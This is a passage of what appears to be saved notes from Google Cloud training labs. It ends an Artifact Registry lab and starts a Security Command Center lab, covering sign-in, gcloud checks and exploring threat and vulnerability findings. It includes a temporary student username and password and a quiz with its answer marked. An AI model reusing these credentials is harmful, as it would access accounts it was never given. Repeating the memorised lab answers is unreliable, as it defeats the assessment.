border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='check-the-java-package-in-artifact-registry'><span>Check the Java package in Artifact Registry</span></h3><p><span>In the Cloud console go to </span><strong><span>Artifact Registry &gt; Repositories</span></strong><span> and click into </span><code>container-dev-java-repo</code><span> to check that the </span><code>hello-world</code><span> binary artifact is there:</span></p><p><img src="images\TyBBKDNjWzPuuh%2B6UVeVgOebFt%2BdpjwV55YmJymBU48%3D" referrerpolicy="no-referrer" alt="Artifact Registry"></p><h2 id='congratulations-37'><span>Congratulations!</span></h2><p><span>In this lab you learned about some of the features available in Artifact Registry. You first created repositories for containers and language packages. You then managed container images with Artifact Registry and integrated it with Cloud Code. Finally, you configured Maven to use Artifact Registry for Java dependencies. You now have a solid understanding of features available in Artifact Registry.</span></p><p>&nbsp;</p><h1 id='19--mitigate-threats-and-vulnerabilities-with-security-command-center'><span>19- Mitigate Threats and Vulnerabilities with Security Command Center</span></h1><p>&nbsp;</p><h2 id='lab---get-started-with-security-command-center'><span>LAB - Get Started with Security Command Center</span></h2><p>&nbsp;</p><h2 id='overview-40'><span>Overview</span></h2><p><a href='https://cloud.google.com/security-command-center'><span>Security Command Center</span></a><span> (SCC) is a security monitoring platform that helps users accomplish the following:</span></p><ul><li><p><span>Discover security-related misconfigurations of Google Cloud resources.</span></p></li><li><p><span>Report on active threats in Google Cloud environments.</span></p></li><li><p><span>Fix vulnerabilities across Google Cloud assets.</span></p></li></ul><p><span>In this lab, you take your first steps with Security Command Center by exploring the service&#39;s interface, configurations, and vulnerability findings.</span></p><h3 id='objectives-28'><span>Objectives</span></h3><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Explore SCC interface elements.</span></p></li><li><p><span>Configure SCC settings at the project level.</span></p></li><li><p><span>Analyze and fix SCC vulnerability findings.</span></p></li></ul><h3 id='prerequisites-2'><span>Prerequisites</span></h3><p><span>It is recommended, but not required, that you are familiar with the following before starting this lab:</span></p><ul><li><p><span>Cloud computing concepts.</span></p></li><li><p><span>The Google Cloud console.</span></p></li><li><p><span>The </span><a href='https://cloud.google.com/security-command-center/docs/finding-severity-classifications'><span>severity classifications for findings</span></a><span>.</span></p></li></ul><h2 id='setup-and-requirements-35'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-24'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-18'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-4d9ed7863142@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nPhedPImkx6C</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-10'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-03-dc5d137c89b1</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-03-dc5d137c89b1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-4d9ed7863142@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-03-dc5d137c89b1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h2 id='scenario-2'><span>Scenario</span></h2><p><img src="images\qO2i8mve9e0jOrBbEsDzPFfEkM1ea6S0a7mXdN%2FNS%2BA%3D" referrerpolicy="no-referrer" alt="5ce916afc496a60c.jpeg"></p><p>&nbsp;</p><p><span>Cymbal Bank is an American retail bank with over 2,000 branches in all 50 states. It offers comprehensive debit and credit services that are built on top of a robust payments platform. Cymbal Bank is a digitally transforming legacy financial services institution.</span></p><p><span>Cymbal Bank was founded in 1920 under the name Troxler. Cymbal Group acquired the company in 1975 after it had been investing heavily in Cymbal Group&#39;s proprietary ATMs. As the bank grew into a national leader, they put strategic emphasis on modernizing the customer experience both in-person at their branches and digitally through an app they released in 2014. Cymbal Bank employs 42,000 people nationwide and, in 2019, reported $24 billion in revenue.</span></p><p><span>Cymbal Bank is interested in integrating a centralized security monitoring platform to help monitor threats and remediate vulnerabilities across their Google Cloud resources in their corporate banking applications. As a Cloud Security Engineer, you are tasked with learning about Security Command Center&#39;s cutting-edge features so you can deliver a presentation to the CTO on the services&#39; benefits.</span></p><h2 id='task-1-explore-scc-interface-elements'><span>Task 1. Explore SCC interface elements</span></h2><p><span>In this task, you explore the Security Command Center (SCC) interface to learn about the service&#39;s chief features.</span></p><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>Security &gt; Risk Overview</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If you receive a message informing you that you need to &quot;Create an Organization&quot;, simply refresh the browser.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Risk overview</span></strong><span> page, scroll down and investigate the information panels that refer to </span><strong><span>New threats over time</span></strong><span> and </span><strong><span>Vulnerabilities per resource type</span></strong><span>.</span></p></li></ol><p><span>Threats and vulnerabilities are two different types of </span><em><span>finding classes</span></em><span>, which SCC uses to categorize and report security issues in your environment. Refer to the </span><a href='https://cloud.google.com/security-command-center/docs/finding-classes'><span>Finding classes</span></a><span> documentation to learn more about finding classes.</span></p><ul><li><p><strong><span>Threats</span></strong><span> notify Google Cloud users about current suspicious activities happening in their Google Cloud environments, such as a service account investigating its own permissions.</span></p></li><li><p><strong><span>Vulnerabilities</span></strong><span> provide information on misconfigurations or vulnerabilities of resources, such as an open TCP port or an outdated library running on a virtual machine.</span></p></li></ul><p><span>A </span><em><span>finding</span></em><span> is a record generated by SCC, which provides details on vulnerability or threat data in the Security Command Center dashboard.</span></p><ol start='' ><li><p><span>On the </span><strong><span>New threats over time</span></strong><span> card, click the </span><strong><span>Findings by resource type</span></strong><span> tab.</span></p></li></ol><p><span>This card enumerates currently active threats that have happened in your project during the period of time determined by the &quot;Time range&quot; dropdown on the right side of this information panel.</span></p><p><strong><span>Note:</span></strong><span> In this lab instance, the number of threats are zero because you are in a sandbox Google Cloud project that has never been attacked before. You explore how to protect yourself from threats in another lab, </span><em><span>Detect and Investigate Threats with Security Command Center</span></em><span>.</span></p><p><span>By default, the time range dropdown shows all threats that appeared during the last 7 days, but you can view all threats that happened during the last 180 days.</span></p><ol start='' ><li><p><span>From the </span><strong><span>Time range</span></strong><span> selector, select </span><strong><span>Last 180 days</span></strong><span>.</span></p></li><li><p><span>Scroll down to the </span><strong><span>Vulnerabilities per resource type</span></strong><span> card.</span></p></li></ol><p><img src="images\QArEzwrf4TENUugm%2Fx4XdZL8%2BZRZ36yyqpexD1Bb9xM%3D" referrerpolicy="no-referrer" alt="Active vulnerabilities in the last 180 days"></p><p><span>There should be around 80 active vulnerabilities listed.</span></p><p><span>A majority of these findings are generated because you are using a default VPC network, which is insecure by design, for the purposes of this lab. For example, it contains firewall rules that allow SSH and RDP access from any IP address.</span></p><ol start='' ><li><p><span>Now scroll down to the </span><strong><span>Active vulnerabilities</span></strong><span> card.</span></p></li><li><p><span>If it isn&#39;t selected by default, click the </span><strong><span>Findings by category</span></strong><span> tab.</span></p></li></ol><p><span>This shows your environment&#39;s vulnerabilities organized by different categories of vulnerabilities and their </span><em><span>severity</span></em><span>. The severity is a property of the finding that helps to estimate the potential risk that an issue poses to the Google Cloud environment.</span></p><p><span>The level of severity cannot be changed—each type of finding has a severity level that is predetermined by SCC. Below is a list of the different types of severities and common examples:</span></p><ul><li><p><strong><span>Critical</span></strong><span> - For example, a Reverse Shell session launched from inside of a GKE Pod.</span></p></li><li><p><strong><span>High</span></strong><span> - For example, an SSH port opened to the entire Internet (0.0.0.0/0);</span></p></li><li><p><strong><span>Medium</span></strong><span> - For example, one of primitive IAM roles (Owner/Editor/Viewer) has been granted to a user or a service account.</span></p></li><li><p><strong><span>Low</span></strong><span> - For example, no VPC Flow logs are collected.</span></p></li><li><p><strong><span>Unspecified</span></strong><span> - Can appear in SCC, but is not common.</span></p></li></ul><p><span>Detailed criteria for how SCC sets a finding&#39;s severity are described on the </span><a href='https://cloud.google.com/security-command-center/docs/finding-severity-classifications'><span>Finding severities</span></a><span> page.</span></p><p><strong><span>Note:</span></strong><span> Take notice that the findings about open RDP and SSH ports have high severity levels.</span></p><ol start='' ><li><p><span>Now click the </span><strong><span>Findings by resource type</span></strong><span> tab. This shows vulnerabilities categorized by the different types of Google Cloud resources that are available.</span></p></li></ol><p><strong><span>Note:</span></strong><span> This project has a default VPC Network, so most findings here are related to network components such as firewall, network or subnetwork.</span></p><ol start='' ><li><p><span>Finally, click the </span><strong><span>Findings by project</span></strong><span> tab. This tab is intended for use with SCC on the level of a folder or organization root node.</span></p></li></ol><p><strong><span>Note:</span></strong><span> In our lab we have access only to one project, so this tab contains only the name of the current project.</span></p><ol start='' ><li><p><span>From the </span><strong><span>Security</span></strong><span> portal, which you access if you select </span><strong><span>Security</span></strong><span> from the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), note the various tabs listed under the Security Command Center header. Here is a description of each.</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>SCC section</span></th><th style='text-align:left;' ><span>Description</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Risk Overview</span></strong></td><td style='text-align:left;' ><span>Shows your environment&#39;s vulnerabilities organized by different categories of vulnerabilities and severity.</span></td></tr><tr><td style='text-align:left;' ><strong><span>Threats</span></strong></td><td style='text-align:left;' ><span>Gives you a quick overview of findings that are classified as threats in SCC. Some examples could be a successful attempt of a </span><a href='https://cloud.google.com/security-command-center/docs/how-to-use-event-threat-detection#brute-force:-ssh'><span>Brute Force: SSH</span></a><span> attack, cryptomining software running on compute resources, i.e. the </span><a href='https://cloud.google.com/security-command-center/docs/how-to-use-vm-threat-detection#cryptocurrency-mining-yara-rule'><span>Execution: Cryptocurrency Mining YARA Rule</span></a><span>, and a </span><a href='https://cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#reverse_shell'><span>Reverse Shell</span></a><span> session that was launched from inside a GKE container.</span></td></tr><tr><td style='text-align:left;' ><strong><span>Vulnerabilities</span></strong></td><td style='text-align:left;' ><span>Gives you a quick overview of all misconfigurations or flaws in software that might exist in the current scope (whether that be inside your project, folder, or organization). This gives you more fine-grained access to the vulnerabilities, allowing you to drill down into each one. Some examples of vulnerabilities are an </span><a href='https://cloud.google.com/security-command-center/docs/how-to-remediate-security-health-analytics-findings#open_mysql_port'><span>Open MySQL port</span></a><span> that is open to the whole Internet, an instance of </span><a href='https://cloud.google.com/security-command-center/docs/how-to-remediate-security-health-analytics-findings#primitive_roles_used'><span>Primitive roles used</span></a><span> e.g. Owner/Editor/Viewer role assigned to a user or a Service Account, and a web-page or a web-application vulnerable to </span><a href='https://cloud.google.com/security-command-center/docs/how-to-remediate-web-security-scanner-findings#xss'><span>XSS</span></a><span> attacks.</span></td></tr><tr><td style='text-align:left;' ><strong><span>Compliance</span></strong></td><td style='text-align:left;' ><span>Shows information about compatibility of your Project with the most important compliance standards such as CIS, PCI DSS, NIST 800-53 and others.</span></td></tr><tr><td style='text-align:left;' ><strong><span>Assets</span></strong></td><td style='text-align:left;' ><span>Includes asset information from Cloud Asset Inventory, which continuously monitors assets in your cloud environment.</span></td></tr><tr><td style='text-align:left;' ><strong><span>Findings</span></strong></td><td style='text-align:left;' ><span>Allows you to explore all findings available in the SCC database.</span></td></tr><tr><td style='text-align:left;' ><strong><span>Sources</span></strong></td><td style='text-align:left;' ><span>Details the software modules that analyze configuration of Google Cloud resources and monitor current activities by reading log files and checking currently running processes.</span></td></tr><tr><td style='text-align:left;' ><strong><span>Posture Management</span></strong></td><td style='text-align:left;' ><span>Lets you use the security posture service in the SCC. Refer to the </span><a href='https://cloud.google.com/security-command-center/docs/how-to-use-security-posture'><span>Manage a security posture</span></a><span> guide for more detail.</span></td></tr><tr><td style='text-align:left;' >&nbsp;</td><td style='text-align:left;' >&nbsp;</td></tr></tbody></table></figure><p>&nbsp;</p><p><span>What triggered the significant amount of findings in this project?</span></p><ul><li><p><span>The project contains a default service accounts.</span></p></li><li><p><strong><span>The project contains default VPC network.</span></strong></p></li><li><p><span>All Google Cloud projects are insecure.</span></p></li><li><p><span>They were custom generated for this lab.</span></p></li></ul><p><span>Submit</span></p><p>&nbsp;</p><h2 id='task-2-configure-scc-settings-at-the-project-level'><span>Task 2. Configure SCC settings at the project level</span></h2><p><span>In this task, you explore how to configure SCC settings at the project level.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Settings</span></strong><span> in the top right corner of the </span><strong><span>Risk overview</span></strong><span> page.</span></p></li><li><p><span>Ensure you are on the </span><strong><span>Services</span></strong><span> tab.</span></p></li></ol><p><span>This tab allows you to set up parameters of SCC&#39;s integrated services, which are also called sources (&quot;the brains of SCC&quot; that you explored in the previous task). For the purposes of this lab, the terms </span><em><span>services</span></em><span> and </span><em><span>sources</span></em><span> are interchangeable.</span></p><p><span>Services detect threats and vulnerabilities and provide information to SCC. Most of them are available only in the Premium edition of SCC, which is provisioned in this lab.</span></p><p><span>The following are built-in services that you can configure:</span></p><ul><li><p><strong><span>Security Health Analytics (SHA)</span></strong><span>—Finds and reports misconfigurations of resources (disabled logs, extra IAM permissions, publicly exposed services). This is what we have currently enabled in our project and what detected the 76 vulnerabilities in our project.</span></p></li><li><p><strong><span>Web Security Scanner (WSS)</span></strong><span>—Scans publicly available web applications exposed via external IP addresses and checks for </span><a 